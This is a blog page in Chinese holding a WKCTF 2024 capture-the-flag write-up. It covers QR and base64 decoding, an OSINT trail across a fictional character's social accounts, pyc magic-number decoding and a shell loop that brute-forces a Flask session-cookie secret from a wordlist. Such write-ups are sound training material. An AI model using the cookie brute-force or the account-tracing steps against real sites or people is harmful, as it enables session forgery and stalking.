<p>一般解题思路：将最后的一个IDAT模块解压提取出来，因为这里有出题人所隐藏的信息，看了网上一个题的解题思路是将其IDAT的数据提取出来转二进制，进行二维码绘图，扫码即可得flag，在这里就不再演示了</p>
<p><img src="/img/1721568082485-39.png" alt="img"></p>
<p>发现长度为3394的模块异常</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
    <article id="post-WKCTF" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2024/07/21/WKCTF/" class="article-date">
      <time datetime="2024-07-21T09:09:12.000Z" itemprop="datePublished">2024-07-21</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2024/07/21/WKCTF/">WKCTF</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <span id="more"></span>

<h3 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h3><p>twinhex编码解码，得到base64编码，从格式看出是图⽚转了base64，于是⽤在线Base64转图⽚恢复图⽚，是个⼆维码，扫描得到要发送WKCTF2024到公众号获取flag。</p>
<h3 id="小z的社交网络"><a href="#小z的社交网络" class="headerlink" title="小z的社交网络"></a>小z的社交网络</h3><p>题目显示的是AES的ecb加密方式，这里给的是一张ppm图片，图片格式已经损坏 ，根据ElectronicColoringBook可以对其进行恢复</p>
<p><img src="/img/1721553107561-4.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ElectronicColoringBook.py <span class="built_in">id</span>.ppm --blocksize=<span class="number">3</span> -p <span class="number">3</span> -o <span class="number">10</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/1721553107560-1.png" alt="img"></p>
<p>得知其账号</p>
<p>d3d3LnppbWFibHVlLmxpZmU&#x3D; </p>
<p><img src="/img/1721553107560-2.png" alt="img"></p>
<p>继续在微博⾥找，可以看到有微博说明了密码是⼥朋友⽣⽇，再在下⼀条可以看到他⼥朋友的⼩红书 </p>
<p>图⽚⽔印，根据⽔印找到其账号，然后在个⼈简介找到⼀个base58编码，解密发现是qq，访问qq可以 </p>
<p>看到⽣⽇20000917，那么就可以解开博客了。博客是个提⽰，提⽰要去找github账号。  </p>
<p><a target="_blank" rel="noopener" href="https://github.com/BeBetterCoder/WKCTF%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%8F%91%E7%8E%B0%E8%BF%99%E9%87%8C%E4%BB%96%E8%BF%9B%E8%A1%8C%E5%88%A0%E9%99%A4%E4%BA%86flag.zip">https://github.com/BeBetterCoder/WKCTF，可以发现这里他进行删除了flag.zip</a></p>
<p><img src="/img/1721553107560-3.png" alt="img"></p>
<p>4.根据博客的域名等信息去git搜索ZimaBlue可以找到其账号，有个库叫做WKCTF，在⾥⾯只有 </p>
<p>readme，但是在commit⾥可以看到之前删除的⽂件，找到flag.swp，通过在linux下 vim -r FLAG可恢 </p>
<p>复⽂件。 </p>
<h3 id="不套是你的谎言"><a href="#不套是你的谎言" class="headerlink" title="不套是你的谎言"></a>不套是你的谎言</h3><p>附件就一个txt文件，如果做过python逆向的话可以看出这个是pyc的magic头。每一个magic头对应相应的python小版本。因为没有别的信息，因此考虑先把每个hex转成python小版本试试看。关于py版本和magic的关系网上可以找到，reverse过程的脚本如下：</p>
<p>如果取每个python小版本的数字那刚好就是0-9，因此考虑这是十进制。连起来转int再转bytes可以看出是zip文件。这个zip是伪加密，因此改一下两处标志位可以正常解压。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_magic</span>(<span class="params">magic_number</span>):</span><br><span class="line">    tmp = <span class="built_in">int</span>(magic_number[<span class="number">2</span>:],<span class="number">16</span>)</span><br><span class="line">    tmp = long_to_bytes(tmp)</span><br><span class="line">    number = <span class="built_in">int</span>.from_bytes(tmp[:<span class="number">2</span>],<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> number</span><br><span class="line"></span><br><span class="line">PYTHON_MAGIC = &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Python 3</span></span><br><span class="line">    <span class="number">3000</span>: (<span class="number">3</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="number">3010</span>: (<span class="number">3</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="number">3020</span>: (<span class="number">3</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="number">3030</span>: (<span class="number">3</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="number">3040</span>: (<span class="number">3</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="number">3050</span>: (<span class="number">3</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="number">3060</span>: (<span class="number">3</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="number">3061</span>: (<span class="number">3</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="number">3071</span>: (<span class="number">3</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="number">3081</span>: (<span class="number">3</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="number">3091</span>: (<span class="number">3</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="number">3101</span>: (<span class="number">3</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="number">3103</span>: (<span class="number">3</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="number">3111</span>: (<span class="number">3</span>, <span class="number">0</span>),  <span class="comment"># a4</span></span><br><span class="line">    <span class="number">3131</span>: (<span class="number">3</span>, <span class="number">0</span>),  <span class="comment"># a5</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Python 3.1</span></span><br><span class="line">    <span class="number">3141</span>: (<span class="number">3</span>, <span class="number">1</span>),  <span class="comment"># a0</span></span><br><span class="line">    <span class="number">3151</span>: (<span class="number">3</span>, <span class="number">1</span>),  <span class="comment"># a0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Python 3.2</span></span><br><span class="line">    <span class="number">3160</span>: (<span class="number">3</span>, <span class="number">2</span>),  <span class="comment"># a0</span></span><br><span class="line">    <span class="number">3170</span>: (<span class="number">3</span>, <span class="number">2</span>),  <span class="comment"># a1</span></span><br><span class="line">    <span class="number">3180</span>: (<span class="number">3</span>, <span class="number">2</span>),  <span class="comment"># a2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Python 3.3</span></span><br><span class="line">    <span class="number">3190</span>: (<span class="number">3</span>, <span class="number">3</span>),  <span class="comment"># a0</span></span><br><span class="line">    <span class="number">3200</span>: (<span class="number">3</span>, <span class="number">3</span>),  <span class="comment"># a0</span></span><br><span class="line">    <span class="number">3220</span>: (<span class="number">3</span>, <span class="number">3</span>),  <span class="comment"># a1</span></span><br><span class="line">    <span class="number">3230</span>: (<span class="number">3</span>, <span class="number">3</span>),  <span class="comment"># a4</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Python 3.4</span></span><br><span class="line">    <span class="number">3250</span>: (<span class="number">3</span>, <span class="number">4</span>),  <span class="comment"># a1</span></span><br><span class="line">    <span class="number">3260</span>: (<span class="number">3</span>, <span class="number">4</span>),  <span class="comment"># a1</span></span><br><span class="line">    <span class="number">3270</span>: (<span class="number">3</span>, <span class="number">4</span>),  <span class="comment"># a1</span></span><br><span class="line">    <span class="number">3280</span>: (<span class="number">3</span>, <span class="number">4</span>),  <span class="comment"># a1</span></span><br><span class="line">    <span class="number">3290</span>: (<span class="number">3</span>, <span class="number">4</span>),  <span class="comment"># a4</span></span><br><span class="line">    <span class="number">3300</span>: (<span class="number">3</span>, <span class="number">4</span>),  <span class="comment"># a4</span></span><br><span class="line">    <span class="number">3310</span>: (<span class="number">3</span>, <span class="number">4</span>),  <span class="comment"># rc2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Python 3.5</span></span><br><span class="line">    <span class="number">3320</span>: (<span class="number">3</span>, <span class="number">5</span>),  <span class="comment"># a0</span></span><br><span class="line">    <span class="number">3330</span>: (<span class="number">3</span>, <span class="number">5</span>),  <span class="comment"># b1</span></span><br><span class="line">    <span class="number">3340</span>: (<span class="number">3</span>, <span class="number">5</span>),  <span class="comment"># b2</span></span><br><span class="line">    <span class="number">3350</span>: (<span class="number">3</span>, <span class="number">5</span>),  <span class="comment"># b2</span></span><br><span class="line">    <span class="number">3351</span>: (<span class="number">3</span>, <span class="number">5</span>),  <span class="comment"># 3.5.2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Python 3.6</span></span><br><span class="line">    <span class="number">3360</span>: (<span class="number">3</span>, <span class="number">6</span>),  <span class="comment"># a0</span></span><br><span class="line">    <span class="number">3361</span>: (<span class="number">3</span>, <span class="number">6</span>),  <span class="comment"># a0</span></span><br><span class="line">    <span class="number">3370</span>: (<span class="number">3</span>, <span class="number">6</span>),  <span class="comment"># a1</span></span><br><span class="line">    <span class="number">3371</span>: (<span class="number">3</span>, <span class="number">6</span>),  <span class="comment"># a1</span></span><br><span class="line">    <span class="number">3372</span>: (<span class="number">3</span>, <span class="number">6</span>),  <span class="comment"># a1</span></span><br><span class="line">    <span class="number">3373</span>: (<span class="number">3</span>, <span class="number">6</span>),  <span class="comment"># b1</span></span><br><span class="line">    <span class="number">3375</span>: (<span class="number">3</span>, <span class="number">6</span>),  <span class="comment"># b1</span></span><br><span class="line">    <span class="number">3376</span>: (<span class="number">3</span>, <span class="number">6</span>),  <span class="comment"># b1</span></span><br><span class="line">    <span class="number">3377</span>: (<span class="number">3</span>, <span class="number">6</span>),  <span class="comment"># b1</span></span><br><span class="line">    <span class="number">3378</span>: (<span class="number">3</span>, <span class="number">6</span>),  <span class="comment"># b2</span></span><br><span class="line">    <span class="number">3379</span>: (<span class="number">3</span>, <span class="number">6</span>),  <span class="comment"># rc1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Python 3.7</span></span><br><span class="line">    <span class="number">3390</span>: (<span class="number">3</span>, <span class="number">7</span>),  <span class="comment"># a1</span></span><br><span class="line">    <span class="number">3391</span>: (<span class="number">3</span>, <span class="number">7</span>),  <span class="comment"># a2</span></span><br><span class="line">    <span class="number">3392</span>: (<span class="number">3</span>, <span class="number">7</span>),  <span class="comment"># a4</span></span><br><span class="line">    <span class="number">3393</span>: (<span class="number">3</span>, <span class="number">7</span>),  <span class="comment"># b1</span></span><br><span class="line">    <span class="number">3394</span>: (<span class="number">3</span>, <span class="number">7</span>),  <span class="comment"># b5</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Python 3.8</span></span><br><span class="line">    <span class="number">3400</span>: (<span class="number">3</span>, <span class="number">8</span>),  <span class="comment"># a1</span></span><br><span class="line">    <span class="number">3401</span>: (<span class="number">3</span>, <span class="number">8</span>),  <span class="comment"># a1</span></span><br><span class="line">    <span class="number">3410</span>: (<span class="number">3</span>, <span class="number">8</span>),  <span class="comment"># a1</span></span><br><span class="line">    <span class="number">3411</span>: (<span class="number">3</span>, <span class="number">8</span>),  <span class="comment"># b2</span></span><br><span class="line">    <span class="number">3412</span>: (<span class="number">3</span>, <span class="number">8</span>),  <span class="comment"># b2</span></span><br><span class="line">    <span class="number">3413</span>: (<span class="number">3</span>, <span class="number">8</span>),  <span class="comment"># b4</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Python 3.9</span></span><br><span class="line">    <span class="number">3420</span>: (<span class="number">3</span>, <span class="number">9</span>),  <span class="comment"># a0</span></span><br><span class="line">    <span class="number">3421</span>: (<span class="number">3</span>, <span class="number">9</span>),  <span class="comment"># a0</span></span><br><span class="line">    <span class="number">3422</span>: (<span class="number">3</span>, <span class="number">9</span>),  <span class="comment"># a0</span></span><br><span class="line">    <span class="number">3423</span>: (<span class="number">3</span>, <span class="number">9</span>),  <span class="comment"># a2</span></span><br><span class="line">    <span class="number">3424</span>: (<span class="number">3</span>, <span class="number">9</span>),  <span class="comment"># a2</span></span><br><span class="line">    <span class="number">3425</span>: (<span class="number">3</span>, <span class="number">9</span>),  <span class="comment"># a2</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;magic.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">807</span>):</span><br><span class="line">        magic_number = f.readline().strip()</span><br><span class="line">        number = reverse_magic(magic_number)</span><br><span class="line">        res = res + <span class="built_in">str</span>(PYTHON_MAGIC[number][<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(res)))</span><br></pre></td></tr></table></figure>

<p>打开得到的信息是flask-session，需要去解密，并且提示了密钥为弱口令。github上可以找到工具flask-session-cookie-manager，因为要爆破，所以搞个shell脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#！/bin/bash</span></span><br><span class="line"> <span class="keyword">while</span> read line</span><br><span class="line"> do</span><br><span class="line">  echo $line</span><br><span class="line">  python3  flask_session_cookie_manager3.py decode -s $line -c <span class="string">&#x27;eyJhbGdvcml0aG0iOiJkZXMiLCJmbGFnIjoiVW5BbVBWWTRhdCt2bkJqellPNytUZEZSMmZEYnhScytqQzdsMWt2b2hUMFp4clBDOEJUTWJBPT0ifQ.ZkyTwA.KPlAnhfBH8qMClLyoP6yboafHyw&#x27;</span></span><br><span class="line"> done &lt;  top1000.txt</span><br></pre></td></tr></table></figure>

<p>爆破得到：</p>
<p>12312312</p>
<p>{‘algorithm’: ‘des’, ‘flag’: ‘UnAmPVY4at+vnBjzYO7+TdFR2fDbxRs+jC7l1kvohT0ZxrPC8BTMbA&#x3D;&#x3D;’}</p>
<p>显然在线网站解des即可，密钥就是12312312</p>
<p>在线网站：<a target="_blank" rel="noopener" href="https://the-x.cn/cryptography/Des.aspx">DES在线解密 DES在线加密 des hex - The X 在线工具 (the-x.cn)</a></p>
<p>WKCTF{N0w_u_Know_th3_fl4sk_Sess1on}</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
  

</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                &copy; 2024 jothon
            </div>
            <div class="footer-right">
                <a href="http://hexo.io/" target="_blank">Hexo &nbsp;&nbsp;</a><a href="https://github.com/maochunguang" target="_blank">Blog</a> by tommy
            </div>
        </div>
        
            <div class="visit">
                
                    <span id="busuanzi_container_site_pv" style='display:none'>
                        <span id="site-visit" >极客到访数: 
                            <span id="busuanzi_value_site_uv"></span>
                        </span>
                    </span>
                
                
                    <span>, </span>
                
                
                    <span id="busuanzi_container_page_pv" style='display:none'>
                        <span id="page-visit">本页阅读量: 
                            <span id="busuanzi_value_page_pv"></span>
                        </span>
                    </span>
                
            </div>
        
    </div>
</footer>

    </div>
    
<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>


<script src="/js/main.js"></script>


    <script>
        $(document).ready(function() {
            var backgroundnum = 1;
            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
        })
    </script>


<!-- Google Analytics -->
<script type="text/javascript">
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

ga('create', 'xxxxx', 'auto');
ga('send', 'pageview');

</script>
<!-- End Google Analytics -->



	<script>
	var _hmt = _hmt || [];
	(function() {
	  var hm = document.createElement("script");
	  hm.src = "//hm.baidu.com/hm.js?xxxxxx";
	  var s = document.getElementsByTagName("script")[0]; 
	  s.parentNode.insertBefore(hm, s);
	})();
	</script>



<div class="scroll" id="scroll">
    <a href="#"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments"><i class="fa fa-comments-o"></i></a>
    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    $(document).ready(function() {
        if ($("#comments").length < 1) {
            $("#scroll > a:nth-child(2)").hide();
        };
    })
</script>

<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>

  <script language="javascript">
    $(function() {
        $("a[title]").each(function() {
            var a = $(this);
            var title = a.attr('title');
            if (title == undefined || title == "") return;
            a.data('title', title).removeAttr('title').hover(
            function() {
                var offset = a.offset();
                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
                    top: offset.top - a.outerHeight() - 15,
                    left: offset.left + a.outerWidth()/2 + 1
                }).fadeIn(function() {
                    var pop = $(this);
                    setTimeout(function() {
                        pop.remove();
                    }, pop.text().length * 800);
                });
            }, function() {
                $("#anchortitlecontainer").remove();
            });
        });
    });
</script>


  </div>
</body>
</html>